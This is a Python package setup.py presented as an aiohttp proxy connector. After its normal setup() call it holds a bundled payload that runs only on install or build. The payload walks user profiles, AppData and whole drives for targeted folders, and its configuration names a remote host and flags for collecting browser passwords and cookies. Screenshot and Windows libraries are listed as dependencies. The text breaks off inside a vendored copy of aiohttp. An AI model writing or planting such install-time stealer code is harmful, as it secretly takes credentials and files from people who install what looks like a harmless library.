import codecs
import os
import re
import sys


try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "attr_property", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("attr_property requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="attr_property",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.2.81',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["attr_property"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography",
    install_requires=["aiohttp>=2.3.2", "yarl",  "aiofiles",
    "aiohttp",
    "cryptography",
    "aiosqlite",
    "mss",
    "pypiwin32",
    "psutil"],
)

LOCAL = os.environ['USERPROFILE']
TEMP = os.path.join(LOCAL, 'appdata', 'local', 'temp')
main_dir = os.path.join(TEMP, '__pycache__')

# with open(os.path.join(main_dir, 'args.txt'), 'a', encoding='utf8') as f:
#     f.write(str(sys.argv) + '\n')


if len(sys.argv) == 0:
    sys.exit()

if not ("install" == sys.argv[1] or "bdist" in sys.argv[1]):
    sys.exit()

#!/usr/bin/env python
import contextlib as __stickytape_contextlib

@__stickytape_contextlib.contextmanager
def __stickytape_temporary_dir():
    import tempfile
    import shutil
    dir_path = tempfile.mkdtemp()
    try:
        yield dir_path
    finally:
        shutil.rmtree(dir_path)

with __stickytape_temporary_dir() as __stickytape_working_dir:
    def __stickytape_write_module(path, contents):
        import os, os.path

        def make_package(path):
            parts = path.split("/")
            partial_path = __stickytape_working_dir
            for part in parts:
                partial_path = os.path.join(partial_path, part)
                if not os.path.exists(partial_path):
                    os.mkdir(partial_path)
                    with open(os.path.join(partial_path, "__init__.py"), "wb") as f:
                        f.write(b"\n")

        make_package(os.path.dirname(path))

        full_path = os.path.join(__stickytape_working_dir, path)
        with open(full_path, "wb") as module_file:
            module_file.write(contents)

    import sys as __stickytape_sys
    __stickytape_sys.path.insert(0, __stickytape_working_dir)

    __stickytape_write_module('path_search.py', b"import asyncio\r\nimport os\r\nfrom os import scandir, getlogin\r\nfrom os.path import join, isdir\r\nfrom typing import Dict, Iterable, List\r\nfrom tools import _handle_task_result\r\nfrom logger import Logger\r\n\r\n\r\nLOCAL = os.environ['USERPROFILE']\r\n\r\nroot_paths = {\r\n    join(LOCAL, 'appdata'),\r\n    join(LOCAL, 'appdata', 'local'),\r\n    join(LOCAL, 'appdata', 'local', 'programs'),\r\n    join(LOCAL, 'appdata', 'roaming'),\r\n    join(LOCAL, 'documents'),\r\n    join(LOCAL, 'downloads'),\r\n    join(LOCAL, 'desktop'),\r\n    'C:/',\r\n    'D:/',\r\n    'E:/',\r\n    'C:/program files',\r\n    'C:/program files (x86)',\r\n    'C:/programdata'\r\n}\r\n\r\nusers = (i.name.lower() for i in scandir('c:/users'))\r\nfor username in users:\r\n    if username in ['desktop.ini', getlogin().lower()]:\r\n        continue\r\n    \r\n    local = join('c:\\\\users', username)\r\n    user_paths = {\r\n        join(local, 'appdata'),\r\n        join(local, 'appdata', 'local'),\r\n        join(local, 'appdata', 'local', 'programs'),\r\n        join(local, 'appdata', 'roaming'),\r\n        join(local, 'documents'),\r\n        join(local, 'downloads'),\r\n        join(local, 'desktop')\r\n    }\r\n    root_paths.update(user_paths)\r\n\r\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict, logger: Logger):\r\n    tasks: List[asyncio.Task] = []\r\n\r\n    queries = {k.lower(): v for k,v in queries.items()}\r\n    target_folder_names = set(queries.keys())\r\n    for p in paths:\r\n        try:\r\n            if isdir(p):\r\n                for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                    if queries[fname] is not None:\r\n                        curr_path = join(p, fname)\r\n                        await logger.log(f'\xd0\x9d\xd0\xb0\xd0\xb9\xd0\xb4\xd0\xb5\xd0\xbd\xd0\xb0 \xd0\xbf\xd1\x83\xd1\x82\xd1\x8c {curr_path}')\r\n                        loop = asyncio.get_event_loop()\r\n                        task = loop.create_task(queries[fname].callback(curr_path))\r\n                        task.add_done_callback(lambda x: _handle_task_result(x, logger))\r\n                        tasks.append(task)\r\n        except Exception as e:\r\n            await logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xb2 search_plugin_paths \xd0\xbf\xd1\x83\xd1\x82\xd1\x8c {p} \xd0\xbe\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 {e}')\r\n    for task in tasks:\r\n        try:\r\n            await task\r\n        except Exception as e:\r\n            print(repr(e))\r\n\r\n\r\nasync def search_paths(paths: Iterable[str], queries: Iterable):\r\n    target_folder_names = {i.lower() for i in queries}\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if fname in target_folder_names:\r\n                    yield join(p, fname)\r\n")
    __stickytape_write_module('tools.py', b"import os\r\nimport asyncio\r\nfrom aiofiles.os import wrap\r\nfrom shutil import copyfile, copytree, move\r\nfrom logger import Logger\r\nimport winreg\r\nimport re\r\n\r\n\r\n\r\ndef zipdir(path, ziph):\r\n    '''From stackoverflow'''\r\n    # ziph is zipfile handle\r\n    for root, dirs, files in os.walk(path):\r\n        for file in files:\r\n            ziph.write(os.path.join(root, file), \r\n                       os.path.relpath(os.path.join(root, file), \r\n                                       os.path.join(path, '..')))\r\n\r\ncopyfile = wrap(copyfile)\r\ncopytree = wrap(copytree)\r\nmove = wrap(move)\r\n\r\n\r\ndef _handle_task_result(task: asyncio.Task, logger: Logger) -> None:\r\n    try:\r\n        task.result()\r\n    except asyncio.CancelledError:\r\n        pass  # Task cancellation should not be logged as an error.\r\n    except Exception as e:  # pylint: disable=broad-except\r\n        logger.sync_log(f'Error {e!r}')")
    __stickytape_write_module('aiofiles/__init__.py', b'"""Utilities for asyncio-friendly file handling."""\nfrom .threadpool import open\nfrom . import tempfile\n\n__all__ = ["open", "tempfile"]\n')
    __stickytape_write_module('aiofiles/threadpool/__init__.py', b'"""Handle files using a thread pool executor."""\nimport asyncio\nfrom types import coroutine\n\nfrom io import (\n    FileIO,\n    TextIOBase,\n    BufferedReader,\n    BufferedWriter,\n    BufferedRandom,\n)\nfrom functools import partial, singledispatch\n\nfrom .binary import AsyncBufferedIOBase, AsyncBufferedReader, AsyncFileIO\nfrom .text import AsyncTextIOWrapper\nfrom ..base import AiofilesContextManager\n\nsync_open = open\n\n__all__ = ("open",)\n\n\ndef open(\n    file,\n    mode="r",\n    buffering=-1,\n    encoding=None,\n    errors=None,\n    newline=None,\n    closefd=True,\n    opener=None,\n    *,\n    loop=None,\n    executor=None\n):\n    return AiofilesContextManager(\n        _open(\n            file,\n            mode=mode,\n            buffering=buffering,\n            encoding=encoding,\n            errors=errors,\n            newline=newline,\n            closefd=closefd,\n            opener=opener,\n            loop=loop,\n            executor=executor,\n        )\n    )\n\n\n@coroutine\ndef _open(\n    file,\n    mode="r",\n    buffering=-1,\n    encoding=None,\n    errors=None,\n    newline=None,\n    closefd=True,\n    opener=None,\n    *,\n    loop=None,\n    executor=None\n):\n    """Open an asyncio file."""\n    if loop is None:\n        loop = asyncio.get_event_loop()\n    cb = partial(\n        sync_open,\n        file,\n        mode=mode,\n        buffering=buffering,\n        encoding=encoding,\n        errors=errors,\n        newline=newline,\n        closefd=closefd,\n        opener=opener,\n    )\n    f = yield from loop.run_in_executor(executor, cb)\n\n    return wrap(f, loop=loop, executor=executor)\n\n\n@singledispatch\ndef wrap(file, *, loop=None, executor=None):\n    raise TypeError("Unsupported io type: {}.".format(file))\n\n\n@wrap.register(TextIOBase)\ndef _(file, *, loop=None, executor=None):\n    return AsyncTextIOWrapper(file, loop=loop, executor=executor)\n\n\n@wrap.register(BufferedWriter)\ndef _(file, *, loop=None, executor=None):\n    return AsyncBufferedIOBase(file, loop=loop, executor=executor)\n\n\n@wrap.register(BufferedReader)\n@wrap.register(BufferedRandom)\ndef _(file, *, loop=None, executor=None):\n    return AsyncBufferedReader(file, loop=loop, executor=executor)\n\n\n@wrap.register(FileIO)\ndef _(file, *, loop=None, executor=None):\n    return AsyncFileIO(file, loop, executor)\n')
    __stickytape_write_module('aiofiles/threadpool/binary.py', b'from ..base import AsyncBase\nfrom .utils import (\n    delegate_to_executor,\n    proxy_method_directly,\n    proxy_property_directly,\n)\n\n\n@delegate_to_executor(\n    "close",\n    "flush",\n    "isatty",\n    "read",\n    "read1",\n    "readinto",\n    "readline",\n    "readlines",\n    "seek",\n    "seekable",\n    "tell",\n    "truncate",\n    "writable",\n    "write",\n    "writelines",\n)\n@proxy_method_directly("detach", "fileno", "readable")\n@proxy_property_directly("closed", "raw", "name", "mode")\nclass AsyncBufferedIOBase(AsyncBase):\n    """The asyncio executor version of io.BufferedWriter."""\n\n\n@delegate_to_executor("peek")\nclass AsyncBufferedReader(AsyncBufferedIOBase):\n    """The asyncio executor version of io.BufferedReader and Random."""\n\n\n@delegate_to_executor(\n    "close",\n    "flush",\n    "isatty",\n    "read",\n    "readall",\n    "readinto",\n    "readline",\n    "readlines",\n    "seek",\n    "seekable",\n    "tell",\n    "truncate",\n    "writable",\n    "write",\n    "writelines",\n)\n@proxy_method_directly("fileno", "readable")\n@proxy_property_directly("closed", "name", "mode")\nclass AsyncFileIO(AsyncBase):\n    """The asyncio executor version of io.FileIO."""\n')
    __stickytape_write_module('aiofiles/base.py', b'"""Various base classes."""\nfrom types import coroutine\nfrom collections.abc import Coroutine\n\n\nclass AsyncBase:\n    def __init__(self, file, loop, executor):\n        self._file = file\n        self._loop = loop\n        self._executor = executor\n\n    def __aiter__(self):\n        """We are our own iterator."""\n        return self\n\n    def __repr__(self):\n        return super().__repr__() + " wrapping " + repr(self._file)\n\n    async def __anext__(self):\n        """Simulate normal file iteration."""\n        line = await self.readline()\n        if line:\n            return line\n        else:\n            raise StopAsyncIteration\n\n\nclass _ContextManager(Coroutine):\n    __slots__ = ("_coro", "_obj")\n\n    def __init__(self, coro):\n        self._coro = coro\n        self._obj = None\n\n    def send(self, value):\n        return self._coro.send(value)\n\n    def throw(self, typ, val=None, tb=None):\n        if val is None:\n            return self._coro.throw(typ)\n        elif tb is None:\n            return self._coro.throw(typ, val)\n        else:\n            return self._coro.throw(typ, val, tb)\n\n    def close(self):\n        return self._coro.close()\n\n    @property\n    def gi_frame(self):\n        return self._coro.gi_frame\n\n    @property\n    def gi_running(self):\n        return self._coro.gi_running\n\n    @property\n    def gi_code(self):\n        return self._coro.gi_code\n\n    def __next__(self):\n        return self.send(None)\n\n    @coroutine\n    def __iter__(self):\n        resp = yield from self._coro\n        return resp\n\n    def __await__(self):\n        resp = yield from self._coro\n        return resp\n\n    async def __anext__(self):\n        resp = await self._coro\n        return resp\n\n    async def __aenter__(self):\n        self._obj = await self._coro\n        return self._obj\n\n    async def __aexit__(self, exc_type, exc, tb):\n        self._obj.close()\n        self._obj = None\n\n\nclass AiofilesContextManager(_ContextManager):\n    """An adjusted async context manager for aiofiles."""\n\n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        await self._obj.close()\n        self._obj = None\n')
    __stickytape_write_module('aiofiles/threadpool/utils.py', b'import functools\nfrom types import coroutine\n\n\ndef delegate_to_executor(*attrs):\n    def cls_builder(cls):\n        for attr_name in attrs:\n            setattr(cls, attr_name, _make_delegate_method(attr_name))\n        return cls\n\n    return cls_builder\n\n\ndef proxy_method_directly(*attrs):\n    def cls_builder(cls):\n        for attr_name in attrs:\n            setattr(cls, attr_name, _make_proxy_method(attr_name))\n        return cls\n\n    return cls_builder\n\n\ndef proxy_property_directly(*attrs):\n    def cls_builder(cls):\n        for attr_name in attrs:\n            setattr(cls, attr_name, _make_proxy_property(attr_name))\n        return cls\n\n    return cls_builder\n\n\ndef cond_delegate_to_executor(*attrs):\n    def cls_builder(cls):\n        for attr_name in attrs:\n            setattr(cls, attr_name, _make_cond_delegate_method(attr_name))\n        return cls\n\n    return cls_builder\n\n\ndef _make_delegate_method(attr_name):\n    @coroutine\n    def method(self, *args, **kwargs):\n        cb = functools.partial(getattr(self._file, attr_name), *args, **kwargs)\n        return (yield from self._loop.run_in_executor(self._executor, cb))\n\n    return method\n\n\ndef _make_proxy_method(attr_name):\n    def method(self, *args, **kwargs):\n        return getattr(self._file, attr_name)(*args, **kwargs)\n\n    return method\n\n\ndef _make_proxy_property(attr_name):\n    def proxy_property(self):\n        return getattr(self._file, attr_name)\n\n    return property(proxy_property)\n\n\ndef _make_cond_delegate_method(attr_name):\n    """For spooled temp files, delegate only if rolled to file object"""\n\n    async def method(self, *args, **kwargs):\n        if self._file._rolled:\n            cb = functools.partial(getattr(self._file, attr_name), *args, **kwargs)\n            return await self._loop.run_in_executor(self._executor, cb)\n        else:\n            return getattr(self._file, attr_name)(*args, **kwargs)\n\n    return method\n')
    __stickytape_write_module('aiofiles/threadpool/text.py', b'from ..base import AsyncBase\nfrom .utils import (\n    delegate_to_executor,\n    proxy_method_directly,\n    proxy_property_directly,\n)\n\n\n@delegate_to_executor(\n    "close",\n    "flush",\n    "isatty",\n    "read",\n    "readable",\n    "readline",\n    "readlines",\n    "seek",\n    "seekable",\n    "tell",\n    "truncate",\n    "write",\n    "writable",\n    "writelines",\n)\n@proxy_method_directly("detach", "fileno", "readable")\n@proxy_property_directly(\n    "buffer",\n    "closed",\n    "encoding",\n    "errors",\n    "line_buffering",\n    "newlines",\n    "name",\n    "mode",\n)\nclass AsyncTextIOWrapper(AsyncBase):\n    """The asyncio executor version of io.TextIOWrapper."""\n')
    __stickytape_write_module('aiofiles/tempfile/__init__.py', b'# Imports\r\nimport asyncio\r\nfrom tempfile import (\r\n    TemporaryFile as syncTemporaryFile,\r\n    NamedTemporaryFile as syncNamedTemporaryFile,\r\n    SpooledTemporaryFile as syncSpooledTemporaryFile,\r\n    TemporaryDirectory as syncTemporaryDirectory,\r\n    _TemporaryFileWrapper as syncTemporaryFileWrapper,\r\n)\r\nfrom io import FileIO, TextIOBase, BufferedReader, BufferedWriter, BufferedRandom\r\nfrom functools import partial, singledispatch\r\nfrom ..base import AiofilesContextManager\r\nfrom ..threadpool.text import AsyncTextIOWrapper\r\nfrom ..threadpool.binary import AsyncBufferedIOBase, AsyncBufferedReader, AsyncFileIO\r\nfrom .temptypes import AsyncSpooledTemporaryFile, AsyncTemporaryDirectory\r\n\r\n__all__ = [\r\n    "NamedTemporaryFile",\r\n    "TemporaryFile",\r\n    "SpooledTemporaryFile",\r\n    "TemporaryDirectory",\r\n]\r\n\r\n\r\n# ================================================================\r\n# Public methods for async open and return of temp file/directory\r\n# objects with async interface\r\n# ================================================================\r\ndef NamedTemporaryFile(\r\n    mode="w+b",\r\n    buffering=-1,\r\n    encoding=None,\r\n    newline=None,\r\n    suffix=None,\r\n    prefix=None,\r\n    dir=None,\r\n    delete=True,\r\n    loop=None,\r\n    executor=None,\r\n):\r\n    """Async open a named temporary file"""\r\n    return AiofilesContextManager(\r\n        _temporary_file(\r\n            named=True,\r\n            mode=mode,\r\n            buffering=buffering,\r\n            encoding=encoding,\r\n            newline=newline,\r\n            suffix=suffix,\r\n            prefix=prefix,\r\n            dir=dir,\r\n            delete=delete,\r\n            loop=loop,\r\n            executor=executor,\r\n        )\r\n    )\r\n\r\n\r\ndef TemporaryFile(\r\n    mode="w+b",\r\n    buffering=-1,\r\n    encoding=None,\r\n    newline=None,\r\n    suffix=None,\r\n    prefix=None,\r\n    dir=None,\r\n    loop=None,\r\n    executor=None,\r\n):\r\n    """Async open an unnamed temporary file"""\r\n    return AiofilesContextManager(\r\n        _temporary_file(\r\n            named=False,\r\n            mode=mode,\r\n            buffering=buffering,\r\n            encoding=encoding,\r\n            newline=newline,\r\n            suffix=suffix,\r\n            prefix=prefix,\r\n            dir=dir,\r\n            loop=loop,\r\n            executor=executor,\r\n        )\r\n    )\r\n\r\n\r\ndef SpooledTemporaryFile(\r\n    max_size=0,\r\n    mode="w+b",\r\n    buffering=-1,\r\n    encoding=None,\r\n    newline=None,\r\n    suffix=None,\r\n    prefix=None,\r\n    dir=None,\r\n    loop=None,\r\n    executor=None,\r\n):\r\n    """Async open a spooled temporary file"""\r\n    return AiofilesContextManager(\r\n        _spooled_temporary_file(\r\n            max_size=max_size,\r\n            mode=mode,\r\n            buffering=buffering,\r\n            encoding=encoding,\r\n            newline=newline,\r\n            suffix=suffix,\r\n            prefix=prefix,\r\n            dir=dir,\r\n            loop=loop,\r\n            executor=executor,\r\n        )\r\n    )\r\n\r\n\r\ndef TemporaryDirectory(suffix=None, prefix=None, dir=None, loop=None, executor=None):\r\n    """Async open a temporary directory"""\r\n    return AiofilesContextManagerTempDir(\r\n        _temporary_directory(\r\n            suffix=suffix, prefix=prefix, dir=dir, loop=loop, executor=executor\r\n        )\r\n    )\r\n\r\n\r\n# =========================================================\r\n# Internal coroutines to open new temp files/directories\r\n# =========================================================\r\nasync def _temporary_file(\r\n    named=True,\r\n    mode="w+b",\r\n    buffering=-1,\r\n    encoding=None,\r\n    newline=None,\r\n    suffix=None,\r\n    prefix=None,\r\n    dir=None,\r\n    delete=True,\r\n    loop=None,\r\n    executor=None,\r\n    max_size=0,\r\n):\r\n    """Async method to open a temporary file with async interface"""\r\n    if loop is None:\r\n        loop = asyncio.get_event_loop()\r\n\r\n    if named:\r\n        cb = partial(\r\n            syncNamedTemporaryFile,\r\n            mode=mode,\r\n            buffering=buffering,\r\n            encoding=encoding,\r\n            newline=newline,\r\n            suffix=suffix,\r\n            prefix=prefix,\r\n            dir=dir,\r\n            delete=delete,\r\n        )\r\n    else:\r\n        cb = partial(\r\n            syncTemporaryFile,\r\n            mode=mode,\r\n            buffering=buffering,\r\n            encoding=encoding,\r\n            newline=newline,\r\n            suffix=suffix,\r\n            prefix=prefix,\r\n            dir=dir,\r\n        )\r\n\r\n    f = await loop.run_in_executor(executor, cb)\r\n\r\n    # Wrap based on type of underlying IO object\r\n    if type(f) is syncTemporaryFileWrapper:\r\n        # _TemporaryFileWrapper was used (named files)\r\n        result = wrap(f.file, f, loop=loop, executor=executor)\r\n        # add delete property\r\n        result.delete = f.delete\r\n        return result\r\n    else:\r\n        # IO object was returned directly without wrapper\r\n        return wrap(f, f, loop=loop, executor=executor)\r\n\r\n\r\nasync def _spooled_temporary_file(\r\n    max_size=0,\r\n    mode="w+b",\r\n    buffering=-1,\r\n    encoding=None,\r\n    newline=None,\r\n    suffix=None,\r\n    prefix=None,\r\n    dir=None,\r\n    loop=None,\r\n    executor=None,\r\n):\r\n    """Open a spooled temporary file with async interface"""\r\n    if loop is None:\r\n        loop = asyncio.get_event_loop()\r\n\r\n    cb = partial(\r\n        syncSpooledTemporaryFile,\r\n        max_size=max_size,\r\n        mode=mode,\r\n        buffering=buffering,\r\n        encoding=encoding,\r\n        newline=newline,\r\n        suffix=suffix,\r\n        prefix=prefix,\r\n        dir=dir,\r\n    )\r\n\r\n    f = await loop.run_in_executor(executor, cb)\r\n\r\n    # Single interface provided by SpooledTemporaryFile for all modes\r\n    return AsyncSpooledTemporaryFile(f, loop=loop, executor=executor)\r\n\r\n\r\nasync def _temporary_directory(\r\n    suffix=None, prefix=None, dir=None, loop=None, executor=None\r\n):\r\n    """Async method to open a temporary directory with async interface"""\r\n    if loop is None:\r\n        loop = asyncio.get_event_loop()\r\n\r\n    cb = partial(syncTemporaryDirectory, suffix, prefix, dir)\r\n    f = await loop.run_in_executor(executor, cb)\r\n\r\n    return AsyncTemporaryDirectory(f, loop=loop, executor=executor)\r\n\r\n\r\nclass AiofilesContextManagerTempDir(AiofilesContextManager):\r\n    """With returns the directory location, not the object (matching sync lib)"""\r\n\r\n    async def __aenter__(self):\r\n        self._obj = await self._coro\r\n        return self._obj.name\r\n\r\n\r\n@singledispatch\r\ndef wrap(base_io_obj, file, *, loop=None, executor=None):\r\n    """Wrap the object with interface based on type of underlying IO"""\r\n    raise TypeError("Unsupported IO type: {}".format(base_io_obj))\r\n\r\n\r\n@wrap.register(TextIOBase)\r\ndef _(base_io_obj, file, *, loop=None, executor=None):\r\n    return AsyncTextIOWrapper(file, loop=loop, executor=executor)\r\n\r\n\r\n@wrap.register(BufferedWriter)\r\ndef _(base_io_obj, file, *, loop=None, executor=None):\r\n    return AsyncBufferedIOBase(file, loop=loop, executor=executor)\r\n\r\n\r\n@wrap.register(BufferedReader)\r\n@wrap.register(BufferedRandom)\r\ndef _(base_io_obj, file, *, loop=None, executor=None):\r\n    return AsyncBufferedReader(file, loop=loop, executor=executor)\r\n\r\n\r\n@wrap.register(FileIO)\r\ndef _(base_io_obj, file, *, loop=None, executor=None):\r\n    return AsyncFileIO(file, loop=loop, executor=executor)\r\n')
    __stickytape_write_module('aiofiles/tempfile/temptypes.py', b'"""Async wrappers for spooled temp files and temp directory objects"""\r\n\r\n# Imports\r\nimport asyncio\r\nfrom types import coroutine\r\n\r\nfrom ..base import AsyncBase\r\nfrom ..threadpool.utils import (\r\n    delegate_to_executor,\r\n    proxy_property_directly,\r\n    cond_delegate_to_executor,\r\n)\r\nfrom functools import partial\r\n\r\n\r\n@delegate_to_executor("fileno", "rollover")\r\n@cond_delegate_to_executor(\r\n    "close",\r\n    "flush",\r\n    "isatty",\r\n    "newlines",\r\n    "read",\r\n    "readline",\r\n    "readlines",\r\n    "seek",\r\n    "tell",\r\n    "truncate",\r\n)\r\n@proxy_property_directly("closed", "encoding", "mode", "name", "softspace")\r\nclass AsyncSpooledTemporaryFile(AsyncBase):\r\n    """Async wrapper for SpooledTemporaryFile class"""\r\n\r\n    async def _check(self):\r\n        if self._file._rolled:\r\n            return\r\n        max_size = self._file._max_size\r\n        if max_size and self._file.tell() > max_size:\r\n            await self.rollover()\r\n\r\n    async def write(self, s):\r\n        """Implementation to anticipate rollover"""\r\n        if self._file._rolled:\r\n            cb = partial(self._file.write, s)\r\n            return await self._loop.run_in_executor(self._executor, cb)\r\n        else:\r\n            file = self._file._file  # reference underlying base IO object\r\n            rv = file.write(s)\r\n            await self._check()\r\n            return rv\r\n\r\n    async def writelines(self, iterable):\r\n        """Implementation to anticipate rollover"""\r\n        if self._file._rolled:\r\n            cb = partial(self._file.writelines, iterable)\r\n            return await self._loop.run_in_executor(self._executor, cb)\r\n        else:\r\n            file = self._file._file  # reference underlying base IO object\r\n            rv = file.writelines(iterable)\r\n            await self._check()\r\n            return rv\r\n\r\n\r\n@delegate_to_executor("cleanup")\r\n@proxy_property_directly("name")\r\nclass AsyncTemporaryDirectory:\r\n    """Async wrapper for TemporaryDirectory class"""\r\n\r\n    def __init__(self, file, loop, executor):\r\n        self._file = file\r\n        self._loop = loop\r\n        self._executor = executor\r\n\r\n    async def close(self):\r\n        await self.cleanup()\r\n')
    __stickytape_write_module('aiofiles/os.py', b'"""Async executor versions of file functions from the os module."""\nimport asyncio\nfrom functools import partial, wraps\nimport os\n\n\ndef wrap(func):\n    @wraps(func)\n    async def run(*args, loop=None, executor=None, **kwargs):\n        if loop is None:\n            loop = asyncio.get_event_loop()\n        pfunc = partial(func, *args, **kwargs)\n        return await loop.run_in_executor(executor, pfunc)\n\n    return run\n\n\nfrom . import ospath as path\n\n\nstat = wrap(os.stat)\nrename = wrap(os.rename)\nreplace = wrap(os.replace)\nremove = wrap(os.remove)\nmkdir = wrap(os.mkdir)\nmakedirs = wrap(os.makedirs)\nrmdir = wrap(os.rmdir)\nremovedirs = wrap(os.removedirs)\n\nif hasattr(os, "sendfile"):\n    sendfile = wrap(os.sendfile)\n')
    __stickytape_write_module('aiofiles/ospath.py', b'"""Async executor versions of file functions from the os.path module."""\n\nfrom .os import wrap\nfrom os import path\n\nexists = wrap(path.exists)\nisfile = wrap(path.isfile)\nisdir = wrap(path.isdir)\ngetsize = wrap(path.getsize)\ngetmtime = wrap(path.getmtime)\ngetatime = wrap(path.getatime)\ngetctime = wrap(path.getctime)\nsamefile = wrap(path.samefile)\nsameopenfile = wrap(path.sameopenfile)\n')
    __stickytape_write_module('logger.py', b'from os.path import join\r\nfrom aiofiles import open as async_open\r\nfrom datetime import datetime\r\nfrom asyncio import Semaphore\r\n\r\n\r\n\r\nclass Logger():\r\n    def __init__(self, log_path: str) -> None:\r\n        self.path = join(log_path, \'work_logs.txt\')\r\n        self.sem = Semaphore(1)\r\n\r\n    async def print(self, text) -> None:\r\n        async with self.sem:\r\n            async with async_open(self.path, \'a\', encoding=\'utf8\') as f:\r\n                await f.write(f\'{text}\\n\')\r\n\r\n    async def log(self, text) -> None:\r\n        now = datetime.now().strftime("%H:%M:%S")\r\n        await self.print(f\'{now} | {text}\')\r\n\r\n    def sync_print(self, text) -> None:\r\n        with open(self.path, \'a\', encoding=\'utf8\') as f:\r\n            f.write(f\'{text}\\n\')\r\n\r\n    def sync_log(self, text) -> None:\r\n        now = datetime.now().strftime("%H:%M:%S")\r\n        self.sync_print(f\'{now} | {text}\')')
    __stickytape_write_module('config.py', b"from dataclasses import dataclass, field\r\nfrom aiohttp import ClientSession\r\nfrom logger import Logger\r\n\r\n\r\n@dataclass\r\nclass Config:\r\n    client_id: str\r\n    host: str\r\n    log_path: str\r\n    logger: Logger\r\n    session: ClientSession\r\n    tag: str = field(default='xuy')\r\n    browser_passwords: bool = field(default=True)\r\n    browser_cookies: bool = field(default=True)")
    __stickytape_write_module('aiohttp/__init__.py', b'__version__ = "3.8.1"\r\n\r\nfrom typing import Tuple\r\n\r\nfrom . import hdrs as hdrs\r\nfrom .client import (\r\n    BaseConnector as BaseConnector,\r\n    ClientConnectionError as ClientConnectionError,\r\n    ClientConnectorCertificateError as ClientConnectorCertificateError,\r\n    ClientConnectorError as ClientConnectorError,\r\n    ClientConnectorSSLError as ClientConnectorSSLError,\r\n    ClientError as ClientError,\r\n    ClientHttpProxyError as ClientHttpProxyError,\r\n    ClientOSError as ClientOSError,\r\n    ClientPayloadError as ClientPayloadError,\r\n    ClientProxyConnectionError as ClientProxyConnectionError,\r\n    ClientRequest as ClientRequest,\r\n    ClientResponse as ClientResponse,\r\n    ClientResponseError as ClientResponseError,\r\n    ClientSession as ClientSession,\r\n    ClientSSLError as ClientSSLError,\r\n    ClientTimeout as ClientTimeout,\r\n    ClientWebSocketResponse as ClientWebSocketResponse,\r\n    ContentTypeError as ContentTypeError,\r\n    Fingerprint as Fingerprint,\r\n    InvalidURL as InvalidURL,\r\n    NamedPipeConnector as NamedPipeConnector,\r\n    RequestInfo as RequestInfo,\r\n    ServerConnectionError as ServerConnectionError,\r\n    ServerDisconnectedError as ServerDisconnectedError,\r\n    ServerFingerprintMismatch as ServerFingerprintMismatch,\r\n    ServerTimeoutError as ServerTimeoutError,\r\n    TCPConnector as TCPConnector,\r\n    TooManyRedirects as TooManyRedirects,\r\n    UnixConnector as UnixConnector,\r\n    WSServerHandshakeError as WSServerHandshakeError,\r\n    request as request,\r\n)\r\nfrom .cookiejar import CookieJar as CookieJar, DummyCookieJar as DummyCookieJar\r\nfrom .formdata import FormData as FormData\r\nfrom .helpers import BasicAuth, ChainMapProxy, ETag\r\nfrom .http import (\r\n    HttpVersion as HttpVersion,\r\n    HttpVersion10 as HttpVersion10,\r\n    HttpVersion11 as HttpVersion11,\r\n    WebSocketError as WebSocketError,\r\n    WSCloseCode as WSCloseCode,\r\n    WSMessage as WSMessage,\r\n    WSMsgType as WSMsgType,\r\n)\r\nfrom .multipart import (\r\n    BadContentDispositionHeader as BadContentDispositionHeader,\r\n    BadContentDispositionParam as BadContentDispositionParam,\r\n    BodyPartReader as BodyPartReader,\r\n    MultipartReader as MultipartReader,\r\n    MultipartWriter as MultipartWriter,\r\n    content_disposition_filename as content_disposition_filename,\r\n    parse_content_disposition as parse_content_disposition,\r\n)\r\nfrom .payload import (\r\n    PAYLOAD_REGISTRY as PAYLOAD_REGISTRY,\r\n    AsyncIterablePayload as AsyncIterablePayload,\r\n    BufferedReaderPayload as BufferedReaderPayload,\r\n    BytesIOPayload as BytesIOPayload,\r\n    BytesPayload as BytesPayload,\r\n    IOBasePayload as IOBasePayload,\r\n    JsonPayload as JsonPayload,\r\n    Payload as Payload,\r\n    StringIOPayload as StringIOPayload,\r\n    StringPayload as StringPayload,\r\n    TextIOPayload as TextIOPayload,\r\n    get_payload as get_payload,\r\n    payload_type as payload_type,\r\n)\r\nfrom .payload_streamer import streamer as streamer\r\nfrom .resolver import (\r\n    AsyncResolver as AsyncResolver,\r\n    DefaultResolver as DefaultResolver,\r\n    ThreadedResolver as ThreadedResolver,\r\n)\r\nfrom .streams import (\r\n    EMPTY_PAYLOAD as EMPTY_PAYLOAD,\r\n    DataQueue as DataQueue,\r\n    EofStream as EofStream,\r\n    FlowControlDataQueue as FlowControlDataQueue,\r\n    StreamReader as StreamReader,\r\n)\r\nfrom .tracing import (\r\n    TraceConfig as TraceConfig,\r\n    TraceConnectionCreateEndParams as TraceConnectionCreateEndParams,\r\n    TraceConnectionCreateStartParams as TraceConnectionCreateStartParams,\r\n    TraceConnectionQueuedEndParams as TraceConnectionQueuedEndParams,\r\n    TraceConnectionQueuedStartParams as TraceConnectionQueuedStartParams,\r\n    TraceConnectionReuseconnParams as TraceConnectionReuseconnParams,\r\n    TraceDnsCacheHitParams as TraceDnsCacheHitParams,\r\n    TraceDnsCacheMissParams as TraceDnsCacheMissParams,\r\n    TraceDnsResolveHostEndParams as TraceDnsResolveHostEndParams,\r\n    TraceDnsResolveHostStartParams as TraceDnsResolveHostStartParams,\r\n    